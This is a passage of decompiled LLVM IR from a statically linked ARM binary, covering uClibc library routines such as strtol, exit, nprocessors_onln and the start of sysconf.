bb:                                               ; preds = %dec_label_pc_13564
  store i32 4, i32* %v3_13564, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13564, %bb
  call void @__pseudo_cond_branch(i1 %v7_13568, i32 ptrtoint (i32* @global_var_15150.468 to i32))
  br label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_1357c, %.thread2
  %v0_1357c = call i32 @abort()
  br label %dec_label_pc_1357c

; uselistorder directives
  uselistorder i32* %v3_13508, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13564, { 1, 0 }
  uselistorder label %dec_label_pc_13504, { 1, 0 }
}

define i32 @function_13588(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13588:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13588 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13588, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13588
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13588, %bb
  %v4_13594 = phi i32 [ %tmp, %dec_label_pc_13588 ], [ 0, %bb ]
  ret i32 %v4_13594

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_135a8 = call i32 @strtol()
  ret i32 %v0_135a8
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_135c4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_135c4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v0_135e8 = load i32, i32* @r1, align 4
  store i32 %v0_135e8, i32* %sb.global-to-local, align 4
  %v0_135ec = load i32, i32* @r2, align 4
  store i32 %v0_135ec, i32* %r5.global-to-local, align 4
  %v0_135f0 = load i32, i32* @r0, align 4
  store i32 %v0_135f0, i32* %r4.global-to-local, align 4
  %v0_135f4 = load i32, i32* @r3, align 4
  br label %dec_label_pc_13600

dec_label_pc_135fc:                               ; preds = %dec_label_pc_13600
  %v1_135fc = add i32 %v0_13638, 1
  store i32 %v1_135fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %entry, %dec_label_pc_135fc
  %v0_13638 = phi i32 [ %v0_135f0, %entry ], [ %v1_135fc, %dec_label_pc_135fc ]
  %v1_13600 = inttoptr i32 %v0_13638 to i8*
  %v2_13600 = load i8, i8* %v1_13600, align 1
  %v3_13600 = zext i8 %v2_13600 to i32
  store i32 %v3_13600, i32* %r1.global-to-local, align 4
  %v4_13604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 276) to i32*), align 4
  %v2_13608 = mul nuw nsw i32 %v3_13600, 2
  %v2_1360c = add i32 %v2_13608, %v4_13604
  %v3_1360c = inttoptr i32 %v2_1360c to i16*
  %v4_1360c = load i16, i16* %v3_1360c, align 2
  %v1_13610 = and i16 %v4_1360c, 32
  %v2_13610 = icmp eq i16 %v1_13610, 0
  br i1 %v2_13610, label %dec_label_pc_13618, label %dec_label_pc_135fc

dec_label_pc_13618:                               ; preds = %dec_label_pc_13600
  %v7_13618 = icmp eq i8 %v2_13600, 43
  br i1 %v7_13618, label %dec_label_pc_13638, label %dec_label_pc_13620

dec_label_pc_13620:                               ; preds = %dec_label_pc_13618
  %v7_13620 = icmp eq i8 %v2_13600, 45
  br i1 %v7_13620, label %dec_label_pc_13638, label %bb

bb:                                               ; preds = %dec_label_pc_13620
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1363c

dec_label_pc_13638:                               ; preds = %dec_label_pc_13618, %dec_label_pc_13620
  %storemerge47 = phi i32 [ 1, %dec_label_pc_13620 ], [ 0, %dec_label_pc_13618 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_13638 = add i32 %v0_13638, 1
  store i32 %v1_13638, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %bb, %dec_label_pc_13638
  %v0_1365c = phi i32 [ %v0_13638, %bb ], [ %v1_13638, %dec_label_pc_13638 ]
  %v1_1363c = and i32 %v0_135ec, -17
  %v3_1363c = icmp eq i32 %v1_1363c, 0
  br i1 %v3_1363c, label %dec_label_pc_13648, label %bb60

bb60:                                             ; preds = %dec_label_pc_1363c
  br label %bb64

dec_label_pc_13648:                               ; preds = %dec_label_pc_1363c
  %v1_13648 = inttoptr i32 %v0_1365c to i8*
  %v2_13648 = load i8, i8* %v1_13648, align 1
  %v7_1364c = icmp eq i8 %v2_13648, 48
  %v1_13650 = add i32 %v0_135ec, 10
  store i32 %v1_13650, i32* %r5.global-to-local, align 4
  br i1 %v7_1364c, label %dec_label_pc_1365c, label %bb61

bb61:                                             ; preds = %dec_label_pc_13648
  br label %.thread8

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13648
  %v1_1365c = add i32 %v0_1365c, 1
  %v2_1365c = inttoptr i32 %v1_1365c to i8*
  %v3_1365c = load i8, i8* %v2_1365c, align 1
  %v4_1365c = zext i8 %v3_1365c to i32
  store i32 %v1_1365c, i32* %r4.global-to-local, align 4
  %v1_13660 = or i32 %v4_1365c, 32
  %v7_13664 = icmp eq i32 %v1_13660, 120
  %v1_13668 = add i32 %v0_135ec, 8
  store i32 %v1_13668, i32* %r5.global-to-local, align 4
  br i1 %v7_13664, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_1365c
  %v3_13674 = mul i32 %v1_13668, 2
  store i32 %v3_13674, i32* %r5.global-to-local, align 4
  %v2_13678 = add i32 %v0_1365c, 2
  store i32 %v2_13678, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1365c, %bb61, %bb62
  %v1_1374c30 = phi i32 [ %v0_135f0, %bb61 ], [ %v1_1365c, %bb62 ], [ %v1_1365c, %dec_label_pc_1365c ]
  %v0_136c821 = phi i32 [ %v0_1365c, %bb61 ], [ %v2_13678, %bb62 ], [ %v1_1365c, %dec_label_pc_1365c ]
  %v0_1367c = phi i32 [ %v1_13650, %bb61 ], [ %v3_13674, %bb62 ], [ %v1_13668, %dec_label_pc_1365c ]
  %v5_13680 = icmp slt i32 %v0_1367c, 16
  br i1 %v5_13680, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1374c29 = phi i32 [ %v0_135f0, %bb60 ], [ %v1_1374c30, %.thread8 ], [ %v1_1374c30, %bb63 ]
  %v0_136c820 = phi i32 [ %v0_1365c, %bb60 ], [ %v0_136c821, %.thread8 ], [ %v0_136c821, %bb63 ]
  %v0_136a8 = phi i32 [ %v0_135ec, %bb60 ], [ %v0_1367c, %.thread8 ], [ 16, %bb63 ]
  %v1_13684 = add i32 %v0_136a8, -2
  %tmp = icmp ugt i32 %v1_13684, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13694

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13748

dec_label_pc_13694:                               ; preds = %bb64
  %v2_1369c = udiv i32 -1, %v0_136a8
  %v3_1369c = urem i32 -1, %v0_136a8
  store i32 %v0_136a8, i32* %r1.global-to-local, align 4
  %v1_136ac = urem i32 %v3_1369c, 256
  store i32 %v1_136ac, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_1369c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136c8

dec_label_pc_136c4:                               ; preds = %bb71, %dec_label_pc_13724
  %v0_136c4 = phi i32 [ %v1_1370444, %bb71 ], [ %v0_136c4.pre, %dec_label_pc_13724 ]
  br label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_13694, %dec_label_pc_136c4
  %v1_1374c27 = phi i32 [ %v1_1374c29, %dec_label_pc_13694 ], [ %v0_136c4, %dec_label_pc_136c4 ]
  %v0_13704 = phi i32 [ %v0_136c820, %dec_label_pc_13694 ], [ %v0_136c4, %dec_label_pc_136c4 ]
  %v1_136c8 = inttoptr i32 %v0_13704 to i8*
  %v2_136c8 = load i8, i8* %v1_136c8, align 1
  %v3_136c8 = zext i8 %v2_136c8 to i32
  %v1_136cc = add nsw i32 %v3_136c8, -48
  %v1_136d0 = urem i32 %v1_136cc, 256
  store i32 %v1_136d0, i32* %r1.global-to-local, align 4
  %v1_136d8 = or i32 %v3_136c8, 32
  %tmp79 = icmp ult i32 %v1_136d0, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136c8
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_136d8, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_136e0
  %v1_136e4 = add nsw i32 %v1_136d8, -87
  %v5_136ec = urem i32 %v1_136e4, 256
  store i32 %v5_136ec, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_136c8, %dec_label_pc_136e0, %bb65
  %v3_1371c = phi i32 [ %v1_136d0, %dec_label_pc_136c8 ], [ 40, %dec_label_pc_136e0 ], [ %v5_136ec, %bb65 ]
  %v1_136f0 = load i32, i32* %r5.global-to-local, align 4
  %v6_136f4 = icmp slt i32 %v3_1371c, %v1_136f0
  br i1 %v6_136f4, label %dec_label_pc_136f8, label %dec_label_pc_13748.loopexit

dec_label_pc_136f8:                               ; preds = %bb66
  %v0_136f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136f8 = load i32, i32* %r8.global-to-local, align 4
  %v9_136f8 = icmp eq i32 %v0_136f8, %v1_136f8
  br i1 %v9_136f8, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_136f8
  %v1_1370440 = add i32 %v0_13704, 1
  store i32 %v1_1370440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1370c

bb67:                                             ; preds = %dec_label_pc_136f8
  %v3_136f8 = icmp ult i32 %v0_136f8, %v1_136f8
  %v1_13704 = add i32 %v0_13704, 1
  store i32 %v1_13704, i32* %r4.global-to-local, align 4
  br i1 %v3_136f8, label %dec_label_pc_1370c, label %dec_label_pc_13724

dec_label_pc_1370c:                               ; preds = %bb67, %.thread39
  %v1_1370444 = phi i32 [ %v1_1370440, %.thread39 ], [ %v1_13704, %bb67 ]
  %v4_137142443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_1370c = load i32, i32* %sl.global-to-local, align 4
  %v3_1370c = icmp uge i32 %v3_1371c, %v1_1370c
  %v9_1370c = icmp eq i32 %v3_1371c, %v1_1370c
  %v2_13710 = xor i1 %v3_1370c, true
  %v3_13710 = or i1 %v9_1370c, %v2_13710
  br i1 %v3_13710, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_1370c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_1370c, %bb68
  %v4_13714 = phi i32 [ %v4_137142443, %dec_label_pc_1370c ], [ 0, %bb68 ]
  %v2_13714 = xor i1 %v9_1370c, true
  %v3_13714 = and i1 %v3_1370c, %v2_13714
  br i1 %v3_13714, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_13714 = urem i32 %v4_13714, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13718 = phi i32 [ %v5_13714, %bb70 ], [ %v4_13714, %bb69 ]
  %v2_13718 = icmp eq i32 %v0_13718, 0
  br i1 %v2_13718, label %bb71, label %dec_label_pc_13724

bb71:                                             ; preds = %thread-pre-split
  %v4_1371c = mul i32 %v0_136f8, %v1_136f0
  %v5_1371c = add i32 %v4_1371c, %v3_1371c
  store i32 %v5_1371c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136c4

dec_label_pc_13724:                               ; preds = %bb67, %thread-pre-split
  %v0_1372c = call i32 @__aeabi_read_tp()
  %v0_13730 = load i32, i32* %r7.global-to-local, align 4
  %v2_13730 = and i32 %v0_135f4, %v0_13730
  store i32 %v2_13730, i32* %r7.global-to-local, align 4
  %v0_13734 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13734, i32* %ip.global-to-local, align 4
  %v3_13738 = load i16, i16* @global_var_22068.345, align 2
  %v4_13738 = sext i16 %v3_13738 to i32
  %v3_13740 = add i32 %v4_13738, %v0_1372c
  %v4_13740 = inttoptr i32 %v3_13740 to i32*
  store i32 34, i32* %v4_13740, align 4
  %v0_136c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136c4

dec_label_pc_13748.loopexit:                      ; preds = %bb66
  %v0_13748.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %.thread, %dec_label_pc_13748.loopexit
  %v1_1374c = phi i32 [ %v1_1374c27, %dec_label_pc_13748.loopexit ], [ %v1_1374c29, %.thread ]
  %v2_1374c = phi i32 [ %v0_13748.pre, %dec_label_pc_13748.loopexit ], [ %v0_135e8, %.thread ]
  %v2_13748 = icmp eq i32 %v2_1374c, 0
  br i1 %v2_13748, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13748
  %v3_1374c = inttoptr i32 %v2_1374c to i32*
  store i32 %v1_1374c, i32* %v3_1374c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13748, %bb72
  %v0_13754 = load i32, i32* %r7.global-to-local, align 4
  %v2_13754 = icmp eq i32 %v0_13754, 0
  %. = select i1 %v2_13754, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13760 = icmp eq i32 %v0_135f4, 0
  %v0_1378c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13760, label %dec_label_pc_13784, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1378c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1376c, label %dec_label_pc_13784

dec_label_pc_1376c:                               ; preds = %bb76
  %v0_13770 = call i32 @__aeabi_read_tp()
  %v3_13774 = load i16, i16* @global_var_22068.345, align 2
  %v4_13774 = sext i16 %v3_13774 to i32
  %v3_1377c = add i32 %v4_13774, %v0_13770
  %v4_1377c = inttoptr i32 %v3_1377c to i32*
  store i32 34, i32* %v4_1377c, align 4
  %v0_13780 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13780, i32* %ip.global-to-local, align 4
  %v0_13784.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %bb76, %bb73, %dec_label_pc_1376c
  %v0_1378c.pre = phi i32 [ %v0_1378c.pre.pre, %bb76 ], [ %v0_13780, %dec_label_pc_1376c ], [ %v0_1378c.pre.pre, %bb73 ]
  %v0_13784 = phi i32 [ %v0_13754, %bb76 ], [ %v0_13784.pre, %dec_label_pc_1376c ], [ %v0_13754, %bb73 ]
  %v2_13784 = icmp eq i32 %v0_13784, 0
  br i1 %v2_13784, label %dec_label_pc_13784._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13784
  %v2_13788 = sub i32 0, %v0_1378c.pre
  store i32 %v2_13788, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13784._crit_edge

dec_label_pc_13784._crit_edge:                    ; preds = %dec_label_pc_13784, %bb77
  %v0_1378c = phi i32 [ %v2_13788, %bb77 ], [ %v0_1378c.pre, %dec_label_pc_13784 ]
  ret i32 %v0_1378c

; uselistorder directives
  uselistorder i32 %v0_1378c.pre, { 1, 0 }
  uselistorder i32 %v0_1378c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13714, { 1, 0 }
  uselistorder i1 %v3_1370c, { 1, 0 }
  uselistorder i32 %v1_1370c, { 1, 0 }
  uselistorder i32 %v5_136ec, { 1, 0 }
  uselistorder i32 %v1_136d8, { 1, 0 }
  uselistorder i32 %v1_136d0, { 2, 0, 1 }
  uselistorder i32 %v0_13704, { 1, 0, 2 }
  uselistorder i32 %v0_136c4, { 1, 0 }
  uselistorder i32 %v3_13674, { 1, 0 }
  uselistorder i32 %v1_13668, { 1, 0, 2 }
  uselistorder i32 %v0_1365c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13638, { 0, 1, 3, 2 }
  uselistorder i32 %v0_135f4, { 1, 0 }
  uselistorder i32 %v0_135f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135ec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13784._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13784, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13748, { 1, 0 }
  uselistorder label %dec_label_pc_13724, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 1, 0 }
  uselistorder label %dec_label_pc_136c4, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1363c, { 1, 0 }
  uselistorder label %dec_label_pc_13638, { 1, 0 }
  uselistorder label %dec_label_pc_13600, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r5, align 4
  %v4_137b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 140) to i32*), align 4
  store i32 %v4_137b8, i32* @r4, align 4
  %v2_137c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_137d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_137d8)
  %v0_137ec = load i32, i32* @r5, align 4
  %v2_137ec = add i32 %v0_137ec, 16
  %v3_137ec = inttoptr i32 %v2_137ec to i32*
  %v4_137ec = load i32, i32* %v3_137ec, align 4
  call void @__pseudo_branch(i32 %v4_137ec)
  %v0_137fc = load i32, i32* @r5, align 4
  %v2_137fc = add i32 %v0_137fc, 636
  %v3_137fc = inttoptr i32 %v2_137fc to i32*
  %v4_137fc = load i32, i32* %v3_137fc, align 4
  %v2_13804 = icmp eq i32 %v4_137fc, 0
  br i1 %v2_13804, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13810 = xor i1 %v2_13804, true
  call void @__pseudo_cond_branch(i1 %v2_13810, i32 %v4_137fc)
  store i32 %v2_137c0, i32* @r0, align 4
  %v0_13820 = load i32, i32* @r5, align 4
  %v2_13820 = add i32 %v0_13820, 44
  %v3_13820 = inttoptr i32 %v2_13820 to i32*
  %v4_13820 = load i32, i32* %v3_13820, align 4
  call void @__pseudo_branch(i32 %v4_13820)
  %v0_1382c = call i32 @__GI___uClibc_fini()
  %v0_13834 = load i32, i32* @r5, align 4
  %v2_13834 = add i32 %v0_13834, -48220
  %v2_1383c = icmp eq i32 %v2_13834, 0
  br i1 %v2_1383c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13844 = xor i1 %v2_1383c, true
  call void @__pseudo_cond_branch(i1 %v2_13844, i32 %v2_13834)
  %v0_13848 = load i32, i32* @r6, align 4
  %v1_1384c = call i32 @__GI__exit(i32 %v0_13848)
  %v0_13850 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13850, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_13850 = load i32, i32* @r4, align 4
  %v3_13850 = load i32, i32* @r8, align 4
  %v8_13850 = ashr i32 %v2_13850, %v3_13850
  %v9_13850 = and i32 %v8_13850, %v1_1384c
  store i32 %v9_13850, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13868 = phi i32 [ %v1_1384c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13868

; uselistorder directives
  uselistorder i32 %v1_1384c, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -34460), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13890 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -34460))
  store i32 %v1_13890, i32* @r6, align 4
  %v2_13894 = icmp eq i32 %v1_13890, 0
  br i1 %v2_13894, label %dec_label_pc_13914, label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_138a4 = load i32, i32* @r4, align 4
  %v2_138a4 = add i32 %v0_138a4, -34448
  store i32 %v2_138a4, i32* @r8, align 4
  %v2_138a8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_138a8, i32* @r7, align 4
  br label %bb18

dec_label_pc_138b0:                               ; preds = %bb18
  %v3_138b0 = load i32, i32* %stack_var_-36, align 4
  %v1_138b4 = inttoptr i32 %v3_138b0 to i32*
  %v2_138b4 = load i32, i32* %v1_138b4, align 4
  %v1_138b8 = inttoptr i32 %v2_138b4 to i8*
  %v2_138b8 = load i8, i8* %v1_138b8, align 1
  %v7_138bc = icmp eq i8 %v2_138b8, 99
  br i1 %v7_138bc, label %dec_label_pc_138c4, label %.backedge3

dec_label_pc_138c4:                               ; preds = %dec_label_pc_138b0
  %v1_138c4 = add i32 %v2_138b4, 1
  %v2_138c4 = inttoptr i32 %v1_138c4 to i8*
  %v3_138c4 = load i8, i8* %v2_138c4, align 1
  %v7_138c8 = icmp eq i8 %v3_138c4, 112
  br i1 %v7_138c8, label %dec_label_pc_138d0, label %.backedge3

dec_label_pc_138d0:                               ; preds = %dec_label_pc_138c4
  %v1_138d0 = add i32 %v2_138b4, 2
  %v2_138d0 = inttoptr i32 %v1_138d0 to i8*
  %v3_138d0 = load i8, i8* %v2_138d0, align 1
  %v7_138d4 = icmp eq i8 %v3_138d0, 117
  br i1 %v7_138d4, label %dec_label_pc_138dc, label %.backedge3

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138d0
  %v1_138dc = add i32 %v2_138b4, 3
  %v2_138dc = inttoptr i32 %v1_138dc to i8*
  %v3_138dc = load i8, i8* %v2_138dc, align 1
  %v4_138dc = zext i8 %v3_138dc to i32
  %v0_138e0 = load i32, i32* @r4, align 4
  %v1_138e0 = load i32, i32* @sl, align 4
  %v2_138e0 = add i32 %v1_138e0, %v0_138e0
  %v3_138e0 = inttoptr i32 %v2_138e0 to i32*
  %v4_138e0 = load i32, i32* %v3_138e0, align 4
  %v2_138e4 = mul nuw nsw i32 %v4_138dc, 2
  %v2_138e8 = add i32 %v4_138e0, %v2_138e4
  %v3_138e8 = inttoptr i32 %v2_138e8 to i16*
  %v4_138e8 = load i16, i16* %v3_138e8, align 2
  %v1_138ec = and i16 %v4_138e8, 8
  %v2_138ec = icmp eq i16 %v1_138ec, 0
  br i1 %v2_138ec, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_138dc
  %v1_138f0 = load i32, i32* @r5, align 4
  %v2_138f0 = add i32 %v1_138f0, 1
  store i32 %v2_138f0, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_138dc, %dec_label_pc_138b0, %dec_label_pc_138c4, %dec_label_pc_138d0
  %v0_138f4.pre = load i32, i32* @r6, align 4
  %v0_13900.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_1389c
  %v0_13900 = phi i32 [ %v0_13900.pre, %.backedge3 ], [ %v2_138a4, %dec_label_pc_1389c ]
  %v0_138f4 = phi i32 [ %v0_138f4.pre, %.backedge3 ], [ %v1_13890, %dec_label_pc_1389c ]
  %v4_13904 = inttoptr i32 %v0_138f4 to i32*
  %v5_13904 = call i32 @__GI_config_read(i32* %v4_13904, i32 %v2_138a8, i32 258, i32 %v0_13900)
  %v2_13908 = icmp eq i32 %v5_13904, 0
  br i1 %v2_13908, label %dec_label_pc_13978, label %dec_label_pc_138b0

dec_label_pc_13914:                               ; preds = %entry
  %v0_13918 = load i32, i32* @r4, align 4
  %v2_13918 = add i32 %v0_13918, -34444
  store i32 %v2_13918, i32* @r0, align 4
  %v1_1391c = call i32 @__GI_config_open(i32 %v2_13918)
  store i32 %v1_1391c, i32* @r6, align 4
  %v2_13920 = icmp eq i32 %v1_1391c, 0
  br i1 %v2_13920, label %bb19, label %dec_label_pc_1392c

bb19:                                             ; preds = %dec_label_pc_13914
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13978

dec_label_pc_1392c:                               ; preds = %dec_label_pc_13914
  %v0_13930 = load i32, i32* @r4, align 4
  %v2_13930 = add i32 %v0_13930, -34428
  store i32 %v2_13930, i32* @r8, align 4
  %v2_13938 = add i32 %v0_13930, -34392
  store i32 %v2_13938, i32* @r7, align 4
  %v2_1393c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1393c, i32* @r4, align 4
  br label %bb21

dec_label_pc_13944:                               ; preds = %bb21
  %v0_13970 = load i32, i32* @r8, align 4
  %v3_13944 = load i32, i32* %stack_var_-36, align 4
  %v1_13948 = inttoptr i32 %v3_13944 to i32*
  %v2_13948 = load i32, i32* %v1_13948, align 4
  store i32 %v2_13948, i32* @r1, align 4
  %v2_1394c = inttoptr i32 %v0_13970 to i8*
  %v3_1394c = call i32 @__GI_strcoll(i8* %v2_1394c, i32 %v2_13948)
  %v2_13950 = icmp eq i32 %v3_1394c, 0
  br i1 %v2_13950, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13944
  %v1_13954 = load i32, i32* @r5, align 4
  %v2_13954 = add i32 %v1_13954, 1
  store i32 %v2_13954, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13944
  %v0_13960.pre = load i32, i32* @r7, align 4
  %v0_13964.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1392c
  %v0_13964 = phi i32 [ %v0_13964.pre, %.backedge ], [ %v1_1391c, %dec_label_pc_1392c ]
  %v0_13960 = phi i32 [ %v0_13960.pre, %.backedge ], [ %v2_13938, %dec_label_pc_1392c ]
  %v4_13968 = inttoptr i32 %v0_13964 to i32*
  %v5_13968 = call i32 @__GI_config_read(i32* %v4_13968, i32 %v2_1393c, i32 459266, i32 %v0_13960)
  %v2_1396c = icmp eq i32 %v5_13968, 0
  br i1 %v2_1396c, label %dec_label_pc_13978, label %dec_label_pc_13944

dec_label_pc_13978:                               ; preds = %bb18, %bb21, %bb19
  %v0_13978 = load i32, i32* @r6, align 4
  %v1_1397c = inttoptr i32 %v0_13978 to i32*
  %v2_1397c = call i32 @__GI_config_close(i32* %v1_1397c)
  %v0_13980 = load i32, i32* @r5, align 4
  %v2_13980 = icmp eq i32 %v0_13980, 0
  %.v0_13980 = select i1 %v2_13980, i32 1, i32 %v0_13980
  ret i32 %.v0_13980

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13978, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_13dac

bb:                                               ; preds = %entry
  %v7_139d0 = mul i32 %arg1, 4
  %v8_139d0 = add i32 %v7_139d0, ptrtoint (i32* @global_var_139d8.491 to i32)
